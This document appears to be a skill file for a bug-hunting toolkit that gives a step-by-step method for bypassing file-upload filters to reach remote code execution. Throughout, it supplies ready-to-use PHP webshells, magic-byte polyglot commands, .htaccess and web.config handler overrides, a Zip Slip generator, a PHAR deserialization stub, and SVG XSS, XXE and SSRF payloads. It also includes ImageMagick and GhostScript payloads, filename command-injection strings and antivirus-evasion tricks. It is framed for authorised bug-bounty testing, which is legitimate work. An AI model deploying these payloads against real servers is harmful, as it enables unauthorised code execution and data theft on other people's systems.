---
name: upload-bypass
description: File upload bypass methodology — extension bypass, content-type manipulation, magic byte injection, RCE via PHP/ASP/JSP webshell, race condition.
---

# File Upload Bypass & RCE via Upload

## Overview

File upload functionality is one of the most reliable paths to Remote Code Execution (RCE).
Even strong front-end validation can be defeated with a proxy or custom request.
The methodology below covers every major bypass technique from extension tricks
to race conditions, structured as a repeatable workflow.

---

## 1. Extension Bypass

Many filters block only common executable extensions. Test variations aggressively.

### PHP Extensions (targeting PHP servers)
- `.php.jpg` — double extension where parser reads `.php` first
- `.php5`, `.php4`, `.php3`, `.phtml` — alternate PHP handlers
- `.pht` — PHP handler on some Apache configurations
- `.shtml` — Server Side Includes (SSI) execution
- `.inc` — sometimes parsed as PHP depending on config
- `.phar` — PHP Archive, may execute in some contexts

### ASP / IIS Extensions
- `.asp`, `.aspx` — primary ASP handlers
- `.cer` — Certificate file, parsed as ASP on IIS
- `.asa` — Global ASA file, parsed as ASP
- `.ashx` — ASP.NET HTTP handler
- `.asmx` — ASP.NET Web Service

### JSP / Java Extensions
- `.jsp`, `.jspx` — Java Server Pages
- `.war` — Web Application Archive (may auto-deploy)
- `.jsf` — JavaServer Faces

### CGI / Perl / Python
- `.cgi`, `.pl`, `.py`, `.sh` — if server executes them

### Double Extension Variants
```
shell.php.jpg
shell.php.jpeg
shell.jpg.php
shell.png.php
shell.php.xxx
```

### Case Variation
```
shell.PHP
shell.PhP
shell.pHp
```

### Trailing Characters
```
shell.php.
shell.php...
shell.php%20
shell.php%0d
shell.php%0a
```

---

## 2. Content-Type Bypass

Modify the `Content-Type` header to match allowed types.

### Allowed type spoofing
```
Content-Type: image/jpeg
Content-Type: image/png
Content-Type: image/gif
Content-Type: application/octet-stream
```

### Multipart Boundary Tricks
Some parsers get confused by malformed boundaries:
```
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary
Content-Type: image/jpeg
```

### Double Content-Type
```
Content-Type: image/jpeg
Content-Type: application/x-php
```
The first "valid" type may satisfy a naive check.

### Empty / Garbage Content-Type
```
Content-Type: 
Content-Type: fake/value
```
Sometimes bypasses if the server falls back to extension-based handling.

---

## 3. Magic Bytes Bypass

Client-side or naive server-side checks inspect the first few bytes.
Spoof them to pass while embedding executable code after.

### GIF Header
```
GIF89a; <?php system($_GET['cmd']); ?>
```
File begins with `GIF89a` magic bytes.

### PNG Header
```hex
89 50 4E 47 0D 0A 1A 0A
```
Prepend PNG hex header, append PHP payload.

### JPEG Header
```hex
FF D8 FF E0
```
Valid JPEG SOI marker.

### PDF Header
```
%PDF-1.4
%\xE2\xE3\xCF\xD3
```

### Shell Command to Prepend Magic Bytes
```bash
# GIF with PHP payload
echo -n 'GIF89a; ' > shell.php.gif
cat shell.php >> shell.php.gif

# PNG with embedded code
printf '\x89PNG\r\n\x1a\n' > shell.php.png
cat shell.php >> shell.php.png
```

---

## 4. Null Byte Injection

Older PHP versions (<5.3.4) and some libraries truncate at the null byte.

### URL-Encoded Null Byte
```
shell.php%00.jpg
```
Stored as `shell.php`, extension check sees `.jpg`.

### Raw Null Byte in Filename
```
shell.php\x00.jpg
```

### Double-Encoded Null Byte
```
shell.php%2500.jpg
```

### Note
Modern PHP versions have fixed this, but custom applications and
legacy middleware may still be vulnerable.

---

## 5. .htaccess / web.config Upload

If the upload directory allows execution, upload a config file to
re-enable script execution for "safe" extensions.

### .htaccess (Apache)
```apache
<FilesMatch "\.(jpg|jpeg|png|gif)$">
SetHandler application/x-httpd-php
</FilesMatch>
```
Now any uploaded `.jpg` is parsed as PHP.

### Alternative .htaccess
```apache
AddType application/x-httpd-php .jpg
php_value auto_prepend_file "/proc/self/environ"
```

### web.config (IIS)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*"
           modules="FastCgiModule"
           scriptProcessor="C:\php\php-cgi.exe"
           resourceType="Unspecified" />
    </handlers>
  </system.webServer>
</configuration>
```

### Test Strategy
1. Upload `.htaccess` or `web.config` to the uploads directory
2. Upload a `.jpg` webshell
3. Access the `.jpg` and verify PHP execution

---

## 6. Race Condition Upload

Some applications write the file to disk, then validate or move it.
If you can access the file between write and validation, you win.

### Attack Flow
1. Upload a valid-looking file that contains PHP code
2. Immediately request the uploaded file path
3. If the server validates asynchronously or after saving, your
   request may hit the file before removal

### Automation Script
```bash
# Upload in one process, repeatedly request in another
curl -F "file=@shell.php" "$UPLOAD_URL" &
for i in {1..50}; do
  curl -s "$UPLOADS_DIR/shell.php" && break
  sleep 0.1
done
```

### High-Race Variants
- Upload via one connection
- Immediately open a second persistent connection to the expected path
- Use `POST` to the same endpoint to trigger file operations

---

## 7. Compression / ZIP Upload

Many applications allow ZIP extraction for "bulk uploads."

### Zip Slip (Path Traversal in ZIP)
Create a ZIP where the filename contains directory traversal:
```
../../../var/www/html/shell.php
```
When extracted, the file lands outside the upload directory.

### Creating a Malicious ZIP
```bash
# Linux
python3 -c "
import zipfile, os
with zipfile.ZipFile('evil.zip', 'w') as z:
    z.writestr('../../../var/www/html/shell.php', '<?php system(\$_GET[\"cmd\"]); ?>')
"
```

### PHAR Deserialization
If the application includes/extracts uploaded archives:
1. Create a malicious PHAR file with a deserialization gadget
2. Upload it
3. Trigger inclusion via a path like `phar://uploads/evil.jpg`

```php
// Generate PHAR
$phar = new Phar("evil.phar");
$phar->startBuffering();
$phar->addFromString("test.txt", "test");
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$object = new GadgetClass(); // vulnerable class
$phar->setMetadata($object);
$phar->stopBuffering();
```

---

## 8. SVG Upload

SVG is XML. Applications often treat it as a safe image.

### XSS via SVG onload
```xml
<?xml version="1.0" standalone="no"?>
<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN"
  "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
<svg version="1.1" baseProfile="full" xmlns="http://www.w3.org/2000/svg"
     onload="alert(document.domain)">
  <rect width="100" height="100" fill="red" />
</svg>
```

### XXE via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<svg width="100" height="100">
  <text>&xxe;</text>
</svg>
```

### SSRF via SVG
```xml
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE svg [
  <!ENTITY ssrf SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<svg width="100" height="100">
  <text>&ssrf;</text>
</svg>
```

---

## 9. ImageMagick / GhostScript RCE

If the server uses ImageMagick or GhostScript to process uploads,
you may achieve RCE via crafted image formats.

### MSL (Magick Scripting Language)
```xml
<?xml version="1.0" encoding="UTF-8"?>
<image>
  <read filename="caption:&lt;?php system(\$_GET['cmd']); ?&gt;" />
  <write filename="/var/www/html/shell.php" />
</image>
```
Upload as `shell.msl` or force processing via `msl:shell.msl`.

### EPS / PS via GhostScript
```postscript
%!PS
userdict /setpagedevice known {
  << /PageSize [1 1] >> setpagedevice
} if
(<?php system($_GET['cmd']); ?>) =
```

### EPI (Encapsulated PostScript Interchange)
Some versions interpret `.epi` as executable PostScript.

### GIF with Polyglot Payload
```bash
# ImageTragick or similar vector
# Craft a GIF that is also a valid MSL or PostScript input
# Upload and trigger via extension confusion
```

---

## 10. Filename Injection

The filename itself may be used in dangerous ways.

### Path Traversal in Filename
```
../../shell.php
..%2f..%2fshell.php
..%252f..%252fshell.php
..\..\shell.php
..;/..;/shell.php
```

### Unicode Normalization
```
..%c0%afshell.php
```
Double-encoded or overlong UTF-8 sequences may normalize to `/`.

### Filename as Command Injection
If the server logs or processes the filename in a shell command:
```
$(whoami).jpg
;id;.jpg
`id`.jpg
```

---

## 11. Server-Side Checks & Bypass

### Size Limits
- Upload a tiny payload first to confirm the endpoint
- Split large webshells into tiny chunks if chunked upload is supported
- If max size is enforced early, pad with comments to valid size

### Content Scanning / AV Bypass
- Embed PHP inside valid image data (magic bytes + EXIF comments)
- Use short tags `<?=system($_GET['cmd']);?>`
- Encode payload: `<?php eval(base64_decode("...")); ?>`
- Hide payload in image metadata:
```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' shell.jpg
```

### MIME Type Checking
If the server uses `file` or `mime_content_type()`:
- Prepend magic bytes (Section 3)
- Use valid image containers with embedded code

### Client-Side JavaScript Checks
- Disable JavaScript in browser
- Intercept and modify the request in Burp before it leaves the client
- Use `curl` directly, bypassing the frontend entirely

---

## 12. Tool Methodology

### Burp Intruder for Extension Fuzzing
1. Intercept upload request
2. Send to Intruder
3. Mark the extension in the filename (e.g., `shell.FUZZ`)
4. Use a wordlist of extensions:
```
php
php3
php4
php5
phtml
pht
shtml
inc
asp
aspx
cer
asa
jsp
jspx
war
cgi
pl
py
```
5. Run with null payloads or a small file; look for 200/201 vs 403/415

### Custom Wordlist Generation
```bash
# Generate extension combinations
cat <<EOF > /tmp/upload-ext.txt
php
php.jpg
jpg.php
php5
phtml
pht
shtml
asp
aspx
cer
jsp
jspx
war
cgi
pl
py
sh
EOF
```

### Ffuf for Upload Endpoint Discovery
```bash
ffuf -u https://target.com/FUZZ \
  -w C:/Users/S3ck1llr/bughunting-rig/hunting/wordlists/directories.txt \
  -mc 200,301,302,403
```

### Automated Upload Testing with curl
```bash
# Template upload test
curl -X POST "https://target.com/upload" \
  -F "file=@shell.php;type=image/jpeg" \
  -F "submit=Upload" \
  -v 2>&1 | tee upload-response.txt
```

---

## 13. Evidence Collection Format

Every confirmed upload bypass finding must include:

```
exploit/<finding-id>/
├── finding-summary.md
│   └── File upload filter bypass on /upload.php allows remote code
│       execution via .phtml extension with GIF magic bytes.
├── steps-to-reproduce.md
│   └── 1. Navigate to /upload.php
│       2. Intercept upload request with Burp
│       3. Change filename to shell.phtml and Content-Type to image/gif
│       4. Prepend GIF89a to PHP payload
│       5. Upload and access /uploads/shell.phtml?cmd=id
├── request-1.txt
│   └── Full HTTP request including multipart body
├── response-1.txt
│   └── Server response showing successful upload
├── request-2.txt
│   └── GET /uploads/shell.phtml?cmd=id
├── response-2.txt
│   └── Response body showing uid=33(www-data) gid=33(www-data)
├── payload.txt
│   └── GIF89a; <?php system($_GET['cmd']); ?>
└── screenshot-1.png
    └── Browser showing command output from webshell
```

### Impact Demonstration Requirements
- Show the uploaded file is accessible via HTTP
- Show the payload executes (command output, reverse shell confirmation)
- Include the exact filename, Content-Type, and any magic bytes used
- If using .htaccess or race condition, include timing evidence

---

## 14. Decision Tree

```
Does the upload accept any executable extension?
  YES -> Confirm RCE -> Report
  NO  -> Try extension variants (Case, double, trailing)
Does any variant bypass?
  YES -> Confirm RCE -> Report
  NO  -> Try Content-Type manipulation
Does Content-Type bypass work?
  YES -> Confirm RCE
  NO  -> Try magic bytes + embedded code
Does magic bytes bypass work?
  YES -> Confirm RCE
  NO  -> Try null byte / path traversal in filename
Does filename injection work?
  YES -> Confirm write location -> Report
  NO  -> Try .htaccess / web.config upload
Can you upload a config file?
  YES -> Re-enable PHP execution -> Report
  NO  -> Try ZIP / compression upload
Does ZIP extraction work?
  YES -> Try Zip Slip or PHAR -> Report if RCE
  NO  -> Try SVG / ImageMagick vectors
Does image processing execute code?
  YES -> MSL / EPS / GhostScript -> Report
  NO  -> Try race condition
Can you hit the file before validation?
  YES -> Confirm RCE -> Report
  NO  -> Log dead end -> Move on
```

---

## 15. Quick Reference Checklist

- [ ] Extension blacklists tested (all variants)
- [ ] Content-Type bypass attempted
- [ ] Magic bytes prepended to payload
- [ ] Null byte injection tested (legacy targets)
- [ ] .htaccess or web.config upload attempted
- [ ] Race condition window tested
- [ ] ZIP / PHAR deserialization tested
- [ ] SVG XSS / XXE / SSRF tested
- [ ] ImageMagick / GhostScript vectors tested
- [ ] Filename path traversal / command injection tested
- [ ] Size limits and AV bypass considered
- [ ] Evidence collected in standard format
- [ ] Impact demonstrated (command execution confirmed)
